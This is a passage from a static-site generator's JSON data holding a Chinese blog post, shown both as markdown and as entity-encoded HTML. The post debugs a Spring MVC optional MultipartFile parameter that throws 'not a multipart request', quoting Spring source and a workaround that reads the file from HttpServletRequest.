06;&#x77E5;&#x8BC6;&#xFF1B;&#x591A;&#x753B;&#x601D;&#x7EF4;&#x5BFC;&#x56FE;&#x3001;&#x6280;&#x672F;&#x56FE;&#x8C31;&#xFF0C;&#x628A;&#x77E5;&#x8BC6;&#x90FD;&#x4E32;&#x8D77;&#x6765;&#xFF1B;</p>\n<p>&#x6240;&#x4EE5;&#x6211;&#x5E0C;&#x671B;&#x5F00;&#x535A;&#x5BF9;&#x6211;&#x662F;&#x4E00;&#x4E2A;&#x597D;&#x7684;&#x5F00;&#x7AEF;&#x3002;&#x6559;&#x662F;&#x6700;&#x597D;&#x7684;&#x5B66;&#xFF0C;&#x79EF;&#x6781;&#x5206;&#x4EAB;&#xFF0C;&#x5927;&#x5BB6;&#x5171;&#x52C9;&#x3002;</p>\n"},{"title":"根据源码用HttpServletRequest获取MultipartFile的问题","date":"2016-11-10T10:24:17.000Z","toc":false,"_content":"\n### 问题\n由于某些原因，现在需要这样的一个文件上传接口，这个接口type(String)是必传参数，photoFile(MultipartFile)是非必传参数，即一般情况下需要接受两个参数，分别为photoFile和type，但是偶尔只接受type参数，不需要起到上传作用。\n\n按常规写法，photoFile参数的required配置设置为了false。\n\n奈何调试时发现，photoFile的required配置是失效的。即下面的接口写法，photoFile成了必传参数。\n\n```bash\n@ResponseBody\n@RequestMapping(value = \"/upload\")\npublic String uploadPics(@RequestPart(value = \"photoFile\", required = false) MultipartFile photoFile,\n\t\t@RequestParam(value = \"type\", required = true) String type, HttpServletRequest request) throws Exception {\n\t\t。。。\n}\n```\n\n<!-- more -->\n\n当模拟upload接口请求时，如果不携带photoFile参数，如上接口写法报错如下\n```bash\norg.springframework.web.multipart.MultipartException: The current request is not a multipart request\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.assertIsMultipartRequest(RequestPartMethodArgumentResolver.java:178) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.resolveArgument(RequestPartMethodArgumentResolver.java:116) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:79) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:157) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:124) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:749) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:690) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\t...\n```\n\n---\n\n### 方案\nrequired配置失效，估计是没有走required的相关流程。\n我们根据所报的第三行错误，进入RequestPartMethodArgumentResolver.class的源码的116行查看。\n```bash\n111\t\t@Override\n112\t\tpublic Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer,\n113\t\t\t\tNativeWebRequest request, WebDataBinderFactory binderFactory) throws Exception {\n114\n115\t\t\tHttpServletRequest servletRequest = request.getNativeRequest(HttpServletRequest.class);\n116\t\t\tassertIsMultipartRequest(servletRequest);\n117\n118\t\t\tMultipartHttpServletRequest multipartRequest =\n119\t\t\t\tWebUtils.getNativeRequest(servletRequest, MultipartHttpServletRequest.class);\n120\n121\t\t\tString partName = getPartName(parameter);\n122\t\t\tObject arg;\n123\n124\t\t\tif (MultipartFile.class.equals(parameter.getParameterType())) {\n125\t\t\t\tAssert.notNull(multipartRequest, \"Expected MultipartHttpServletRequest: is a MultipartResolver configured?\");\n126\t\t\t\targ = multipartRequest.getFile(partName);\n\t\t\t}\n\t\t  .....\n```\n\n再点击116行，进入assertIsMultipartRequest方法\n```bash\n175\t\tprivate static void assertIsMultipartRequest(HttpServletRequest request) {\n176\t\t\tString contentType = request.getContentType();\n177\t\t\tif (contentType == null || !contentType.toLowerCase().startsWith(\"multipart/\")) {\n178\t\t\t\tthrow new MultipartException(\"The current request is not a multipart request\");\n179\t\t\t}\n\t\t}\n```\n\n很明显，错误就是178行触发的。而且在上层的几个调用中也没有涉及到required的流程。\n那么问题来了, 接口偶尔需要起到上传作用，如果不改变接口传参形式，就只能改源码了，很明显，这不是好的方案。\n\n**那答案肯定就在源码里了，我们很容易就想到可以在接口处完全去掉photoFile(MultipartFile)参数，然后把模仿源码，从request里去获取MultipartFile对象。**\n\n下面是根据源码118-126行、176-179行修改的接口，经测试是可行的：\n```bash\n@ResponseBody\n@RequestMapping(value = \"/upload\")\npublic String uploadPics(@RequestParam(value = \"type\", required = true) String type,\n\t\tHttpServletRequest request) {\n\t....\n\t// 检测是否为上传请求\n\tString contentType = request.getContentType();\n\tif (contentType != null && contentType.toLowerCase().startsWith(\"multipart/\")) {\n\t\tMultipartHttpServletRequest multipartRequest =\n\t\t\t\tWebUtils.getNativeRequest(request, MultipartHttpServletRequest.class);\n\t\tMultipartFile file = multipartRequest.getFile(\"file\");   \n\t\t....\n\t}\n\t....\n}\n```\n---\n\n### 后记\n问题的处理其实很简单，但是这边文章的记录是为了另一件事。\n\n当时实现这个功能时，发现常规写法走不通，又不好改源码，内心是有草泥马奔腾而过的。\n\n知道答案可能在源码里，猜想可以去用request获取MultipartFile对象，但是又觉得麻烦，不想去干这事，想着可能有更好的办法，然后这事就拖着。\n\n到后来问同事怎么解决，同事说那就从request获取MultipartFile对象咯。:-O\n\n**其实工作经常碰到这类事情，但是很多时候那些 “貌似遥远的路途” 才是真正的捷径 ~**\n\n","source":"_posts/根据源码用HttpServletRequest获取MultipartFile的问题.md","raw":"---\ntitle: 根据源码用HttpServletRequest获取MultipartFile的问题\ncategories:\n  - 错误集锦\ndate: 2016-11-10 18:24:17\ntoc: false\n---\n\n### 问题\n由于某些原因，现在需要这样的一个文件上传接口，这个接口type(String)是必传参数，photoFile(MultipartFile)是非必传参数，即一般情况下需要接受两个参数，分别为photoFile和type，但是偶尔只接受type参数，不需要起到上传作用。\n\n按常规写法，photoFile参数的required配置设置为了false。\n\n奈何调试时发现，photoFile的required配置是失效的。即下面的接口写法，photoFile成了必传参数。\n\n```bash\n@ResponseBody\n@RequestMapping(value = \"/upload\")\npublic String uploadPics(@RequestPart(value = \"photoFile\", required = false) MultipartFile photoFile,\n\t\t@RequestParam(value = \"type\", required = true) String type, HttpServletRequest request) throws Exception {\n\t\t。。。\n}\n```\n\n<!-- more -->\n\n当模拟upload接口请求时，如果不携带photoFile参数，如上接口写法报错如下\n```bash\norg.springframework.web.multipart.MultipartException: The current request is not a multipart request\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.assertIsMultipartRequest(RequestPartMethodArgumentResolver.java:178) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.resolveArgument(RequestPartMethodArgumentResolver.java:116) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:79) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:157) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:124) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:749) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:690) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]\n\t...\n```\n\n---\n\n### 方案\nrequired配置失效，估计是没有走required的相关流程。\n我们根据所报的第三行错误，进入RequestPartMethodArgumentResolver.class的源码的116行查看。\n```bash\n111\t\t@Override\n112\t\tpublic Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer,\n113\t\t\t\tNativeWebRequest request, WebDataBinderFactory binderFactory) throws Exception {\n114\n115\t\t\tHttpServletRequest servletRequest = request.getNativeRequest(HttpServletRequest.class);\n116\t\t\tassertIsMultipartRequest(servletRequest);\n117\n118\t\t\tMultipartHttpServletRequest multipartRequest =\n119\t\t\t\tWebUtils.getNativeRequest(servletRequest, MultipartHttpServletRequest.class);\n120\n121\t\t\tString partName = getPartName(parameter);\n122\t\t\tObject arg;\n123\n124\t\t\tif (MultipartFile.class.equals(parameter.getParameterType())) {\n125\t\t\t\tAssert.notNull(multipartRequest, \"Expected MultipartHttpServletRequest: is a MultipartResolver configured?\");\n126\t\t\t\targ = multipartRequest.getFile(partName);\n\t\t\t}\n\t\t  .....\n```\n\n再点击116行，进入assertIsMultipartRequest方法\n```bash\n175\t\tprivate static void assertIsMultipartRequest(HttpServletRequest request) {\n176\t\t\tString contentType = request.getContentType();\n177\t\t\tif (contentType == null || !contentType.toLowerCase().startsWith(\"multipart/\")) {\n178\t\t\t\tthrow new MultipartException(\"The current request is not a multipart request\");\n179\t\t\t}\n\t\t}\n```\n\n很明显，错误就是178行触发的。而且在上层的几个调用中也没有涉及到required的流程。\n那么问题来了, 接口偶尔需要起到上传作用，如果不改变接口传参形式，就只能改源码了，很明显，这不是好的方案。\n\n**那答案肯定就在源码里了，我们很容易就想到可以在接口处完全去掉photoFile(MultipartFile)参数，然后把模仿源码，从request里去获取MultipartFile对象。**\n\n下面是根据源码118-126行、176-179行修改的接口，经测试是可行的：\n```bash\n@ResponseBody\n@RequestMapping(value = \"/upload\")\npublic String uploadPics(@RequestParam(value = \"type\", required = true) String type,\n\t\tHttpServletRequest request) {\n\t....\n\t// 检测是否为上传请求\n\tString contentType = request.getContentType();\n\tif (contentType != null && contentType.toLowerCase().startsWith(\"multipart/\")) {\n\t\tMultipartHttpServletRequest multipartRequest =\n\t\t\t\tWebUtils.getNativeRequest(request, MultipartHttpServletRequest.class);\n\t\tMultipartFile file = multipartRequest.getFile(\"file\");   \n\t\t....\n\t}\n\t....\n}\n```\n---\n\n### 后记\n问题的处理其实很简单，但是这边文章的记录是为了另一件事。\n\n当时实现这个功能时，发现常规写法走不通，又不好改源码，内心是有草泥马奔腾而过的。\n\n知道答案可能在源码里，猜想可以去用request获取MultipartFile对象，但是又觉得麻烦，不想去干这事，想着可能有更好的办法，然后这事就拖着。\n\n到后来问同事怎么解决，同事说那就从request获取MultipartFile对象咯。:-O\n\n**其实工作经常碰到这类事情，但是很多时候那些 “貌似遥远的路途” 才是真正的捷径 ~**\n\n","slug":"根据源码用HttpServletRequest获取MultipartFile的问题","published":1,"updated":"2016-11-17T11:59:42.681Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbruleo004vgwtmjzexmi9d","content":"<h3 id=\"&#x95EE;&#x9898;\"><a href=\"#&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x95EE;&#x9898;\"></a>&#x95EE;&#x9898;</h3><p>&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x539F;&#x56E0;&#xFF0C;&#x73B0;&#x5728;&#x9700;&#x8981;&#x8FD9;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;type(String)&#x662F;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#xFF0C;photoFile(MultipartFile)&#x662F;&#x975E;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#xFF0C;&#x5373;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x9700;&#x8981;&#x63A5;&#x53D7;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5206;&#x522B;&#x4E3A;photoFile&#x548C;type&#xFF0C;&#x4F46;&#x662F;&#x5076;&#x5C14;&#x53EA;&#x63A5;&#x53D7;type&#x53C2;&#x6570;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x8D77;&#x5230;&#x4E0A;&#x4F20;&#x4F5C;&#x7528;&#x3002;</p>\n<p>&#x6309;&#x5E38;&#x89C4;&#x5199;&#x6CD5;&#xFF0C;photoFile&#x53C2;&#x6570;&#x7684;required&#x914D;&#x7F6E;&#x8BBE;&#x7F6E;&#x4E3A;&#x4E86;false&#x3002;</p>\n<p>&#x5948;&#x4F55;&#x8C03;&#x8BD5;&#x65F6;&#x53D1;&#x73B0;&#xFF0C;photoFile&#x7684;required&#x914D;&#x7F6E;&#x662F;&#x5931;&#x6548;&#x7684;&#x3002;&#x5373;&#x4E0B;&#x9762;&#x7684;&#x63A5;&#x53E3;&#x5199;&#x6CD5;&#xFF0C;photoFile&#x6210;&#x4E86;&#x5FC5;&#x4F20;&#x53C2;&#x6570;&#x3002;</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = <span class=\"string\">&quot;/upload&quot;</span>)</span><br><span class=\"line\">public String uploadPics(@RequestPart(value = <span class=\"string\">&quot;photoFile&quot;</span>, required = <span class=\"literal\">false</span>) MultipartFile photoFile,</span><br><span class=\"line\">\t\t@RequestParam(value = <span class=\"string\">&quot;type&quot;</span>, required = <span class=\"literal\">true</span>) String <span class=\"built_in\">type</span>, HttpServletRequest request) throws Exception {</span><br><span class=\"line\">\t\t&#x3002;&#x3002;&#x3002;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<p>&#x5F53;&#x6A21;&#x62DF;upload&#x63A5;&#x53E3;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x643A;&#x5E26;photoFile&#x53C2;&#x6570;&#xFF0C;&#x5982;&#x4E0A;&#x63A5;&#x53E3;&#x5199;&#x6CD5;&#x62A5;&#x9519;&#x5982;&#x4E0B;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">org.springframework.web.multipart.MultipartException: The current request is not a multipart request</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.assertIsMultipartRequest(RequestPartMethodArgumentResolver.java:178) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.RequestPartMethodArgumentResolver.resolveArgument(RequestPartMethodArgumentResolver.java:116) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.method.support.HandlerMethodArgumentResolverComposite.resolveArgument(HandlerMethodArgumentResolverComposite.java:79) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.method.support.InvocableHandlerMethod.getMethodArgumentValues(InvocableHandlerMethod.java:157) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:124) ~[spring-web-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandleMethod(RequestMappingHandlerAdapter.java:749) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:690) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:83) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:945) ~[spring-webmvc-4.0.2.RELEASE.jar:4.0.2.RELEASE]</span><br><span class=\"line\">\t...</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"&#x65B9;&#x6848;\"><a href=\"#&#x65B9;&#x6848;\" class=\"headerlink\" title=\"&#x65B9;&#x6848;\"></a>&#x65B9;&#x6848;</h3><p>required&#x914D;&#x7F6E;&#x5931;&#x6548;&#xFF0C;&#x4F30;&#x8BA1;&#x662F;&#x6CA1;&#x6709;&#x8D70;required&#x7684;&#x76F8;&#x5173;&#x6D41;&#x7A0B;&#x3002;<br>&#x6211;&#x4EEC;&#x6839;&#x636E;&#x6240;&#x62A5;&#x7684;&#x7B2C;&#x4E09;&#x884C;&#x9519;&#x8BEF;&#xFF0C;&#x8FDB;&#x5165;RequestPartMethodArgumentResolver.class&#x7684;&#x6E90;&#x7801;&#x7684;116&#x884C;&#x67E5;&#x770B;&#x3002;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">111\t\t@Override</span><br><span class=\"line\">112\t\tpublic Object resolveArgument(MethodParameter parameter, ModelAndViewContainer mavContainer,</span><br><span class=\"line\">113\t\t\t\tNativeWebRequest request, WebDataBinderFactory binderFactory) throws Exception {</span><br><span class=\"line\">114</span><br><span class=\"line\">115\t\t\tHttpServletRequest servletRequest = request.getNativeRequest(HttpServletRequest.class);</span><br><span class=\"line\">116\t\t\tassertIsMultipartRequest(servletRequest);</span><br><span class=\"line\">117</span><br><span class=\"line\">118\t\t\tMultipartHttpServletRequest multipartRequest =</span><br><span class=\"line\">119\t\t\t\tWebUtils.getNativeRequest(servletRequest, MultipartHttpServletRequest.class);</span><br><span class=\"line\">120</span><br><span class=\"line\">121\t\t\tString partName = getPartName(parameter);</span><br><span class=\"line\">122\t\t\tObject arg;</span><br><span class=\"line\">123</span><br><span class=\"line\">124\t\t\t<span class=\"keyword\">if</span> (MultipartFile.class.equals(parameter.getParameterType())) {</span><br><span class=\"line\">125\t\t\t\tAssert.notNull(multipartRequest, <span class=\"string\">&quot;Expected MultipartHttpServletRequest: is a MultipartResolver configured?&quot;</span>);</span><br><span class=\"line\">126\t\t\t\targ = multipartRequest.getFile(partName);</span><br><span class=\"line\">\t\t\t}</span><br><span class=\"line\">\t\t  .....</span><br></pre></td></tr></table></figure></p>\n<p>&#x518D;&#x70B9;&#x51FB;116&#x884C;&#xFF0C;&#x8FDB;&#x5165;assertIsMultipartRequest&#x65B9;&#x6CD5;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">175\t\tprivate static void assertIsMultipartRequest(HttpServletRequest request) {</span><br><span class=\"line\">176\t\t\tString contentType = request.getContentType();</span><br><span class=\"line\">177\t\t\t<span class=\"keyword\">if</span> (contentType == null || !contentType.toLowerCase().startsWith(<span class=\"string\">&quot;multipart/&quot;</span>)) {</span><br><span class=\"line\">178\t\t\t\tthrow new MultipartException(<span class=\"string\">&quot;The current request is not a multipart request&quot;</span>);</span><br><span class=\"line\">179\t\t\t}</span><br><span class=\"line\">\t\t}</span><br></pre></td></tr></table></figure></p>\n<p>&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x9519;&#x8BEF;&#x5C31;&#x662F;178&#x884C;&#x89E6;&#x53D1;&#x7684;&#x3002;&#x800C;&#x4E14;&#x5728;&#x4E0A;&#x5C42;&#x7684;&#x51E0;&#x4E2A;&#x8C03;&#x7528;&#x4E2D;&#x4E5F;&#x6CA1;&#x6709;&#x6D89;&#x53CA;&#x5230;required&#x7684;&#x6D41;&#x7A0B;&#x3002;<br>&#x90A3;&#x4E48;&#x95EE;&#x9898;&#x6765;&#x4E86;, &#x63A5;&#x53E3;&#x5076;&#x5C14;&#x9700;&#x8981;&#x8D77;&#x5230;&#x4E0A;&#x4F20;&#x4F5C;&#x7528;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x6539;&#x53D8;&#x63A5;&#x53E3;&#x4F20;&#x53C2;&#x5F62;&#x5F0F;&#xFF0C;&#x5C31;&#x53EA;&#x80FD;&#x6539;&#x6E90;&#x7801;&#x4E86;&#xFF0C;&#x5F88;&#x660E;&#x663E;&#xFF0C;&#x8FD9;&#x4E0D;&#x662F;&#x597D;&#x7684;&#x65B9;&#x6848;&#x3002;</p>\n<p><strong>&#x90A3;&#x7B54;&#x6848;&#x80AF;&#x5B9A;&#x5C31;&#x5728;&#x6E90;&#x7801;&#x91CC;&#x4E86;&#xFF0C;&#x6211;&#x4EEC;&#x5F88;&#x5BB9;&#x6613;&#x5C31;&#x60F3;&#x5230;&#x53EF;&#x4EE5;&#x5728;&#x63A5;&#x53E3;&#x5904;&#x5B8C;&#x5168;&#x53BB;&#x6389;photoFile(MultipartFile)&#x53C2;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6A21;&#x4EFF;&#x6E90;&#x7801;&#xFF0C;&#x4ECE;request&#x91CC;&#x53BB;&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#x3002;</strong></p>\n<p>&#x4E0B;&#x9762;&#x662F;&#x6839;&#x636E;&#x6E90;&#x7801;118-126&#x884C;&#x3001;176-179&#x884C;&#x4FEE;&#x6539;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x7ECF;&#x6D4B;&#x8BD5;&#x662F;&#x53EF;&#x884C;&#x7684;&#xFF1A;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ResponseBody</span><br><span class=\"line\">@RequestMapping(value = <span class=\"string\">&quot;/upload&quot;</span>)</span><br><span class=\"line\">public String uploadPics(@RequestParam(value = <span class=\"string\">&quot;type&quot;</span>, required = <span class=\"literal\">true</span>) String <span class=\"built_in\">type</span>,</span><br><span class=\"line\">\t\tHttpServletRequest request) {</span><br><span class=\"line\">\t....</span><br><span class=\"line\">\t// &#x68C0;&#x6D4B;&#x662F;&#x5426;&#x4E3A;&#x4E0A;&#x4F20;&#x8BF7;&#x6C42;</span><br><span class=\"line\">\tString contentType = request.getContentType();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (contentType != null &amp;&amp; contentType.toLowerCase().startsWith(<span class=\"string\">&quot;multipart/&quot;</span>)) {</span><br><span class=\"line\">\t\tMultipartHttpServletRequest multipartRequest =</span><br><span class=\"line\">\t\t\t\tWebUtils.getNativeRequest(request, MultipartHttpServletRequest.class);</span><br><span class=\"line\">\t\tMultipartFile file = multipartRequest.getFile(<span class=\"string\">&quot;file&quot;</span>);   </span><br><span class=\"line\">\t\t....</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t....</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure></p>\n<hr>\n<h3 id=\"&#x540E;&#x8BB0;\"><a href=\"#&#x540E;&#x8BB0;\" class=\"headerlink\" title=\"&#x540E;&#x8BB0;\"></a>&#x540E;&#x8BB0;</h3><p>&#x95EE;&#x9898;&#x7684;&#x5904;&#x7406;&#x5176;&#x5B9E;&#x5F88;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x8FB9;&#x6587;&#x7AE0;&#x7684;&#x8BB0;&#x5F55;&#x662F;&#x4E3A;&#x4E86;&#x53E6;&#x4E00;&#x4EF6;&#x4E8B;&#x3002;</p>\n<p>&#x5F53;&#x65F6;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x529F;&#x80FD;&#x65F6;&#xFF0C;&#x53D1;&#x73B0;&#x5E38;&#x89C4;&#x5199;&#x6CD5;&#x8D70;&#x4E0D;&#x901A;&#xFF0C;&#x53C8;&#x4E0D;&#x597D;&#x6539;&#x6E90;&#x7801;&#xFF0C;&#x5185;&#x5FC3;&#x662F;&#x6709;&#x8349;&#x6CE5;&#x9A6C;&#x5954;&#x817E;&#x800C;&#x8FC7;&#x7684;&#x3002;</p>\n<p>&#x77E5;&#x9053;&#x7B54;&#x6848;&#x53EF;&#x80FD;&#x5728;&#x6E90;&#x7801;&#x91CC;&#xFF0C;&#x731C;&#x60F3;&#x53EF;&#x4EE5;&#x53BB;&#x7528;request&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x53C8;&#x89C9;&#x5F97;&#x9EBB;&#x70E6;&#xFF0C;&#x4E0D;&#x60F3;&#x53BB;&#x5E72;&#x8FD9;&#x4E8B;&#xFF0C;&#x60F3;&#x7740;&#x53EF;&#x80FD;&#x6709;&#x66F4;&#x597D;&#x7684;&#x529E;&#x6CD5;&#xFF0C;&#x7136;&#x540E;&#x8FD9;&#x4E8B;&#x5C31;&#x62D6;&#x7740;&#x3002;</p>\n<p>&#x5230;&#x540E;&#x6765;&#x95EE;&#x540C;&#x4E8B;&#x600E;&#x4E48;&#x89E3;&#x51B3;&#xFF0C;&#x540C;&#x4E8B;&#x8BF4;&#x90A3;&#x5C31;&#x4ECE;request&#x83B7;&#x53D6;MultipartFile&#x5BF9;&#x8C61;&#x54AF;&#x3002;:-O</p>\n<p><strong>&#x5176;&#x5B9E;&#x5DE5;&#x4F5C;&#x7ECF;&#x5E38;&#x78B0;&#x5230;&#x8FD9;&#x7C7B;&#x4E8B;&#x60C5;&#xFF0C;&#x4F46;&#x662F;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x90A3;&#x4E9B; &#x201C;&#x8C8C;&#x4F3C;&#x9065;&#x8FDC;&#x7684;&#x8DEF;&#x9014;&#x201D; &#x624D;&#x662F;&#x771F;&#x6B63;&#x7684;&#x6377;&#x5F84; ~</strong></p>\n","excerpt":"<h3 id=\"&#x95EE;&#x9898;\"><a href=\"#&#x95EE;&#x9898;\" class=\"headerlink\" 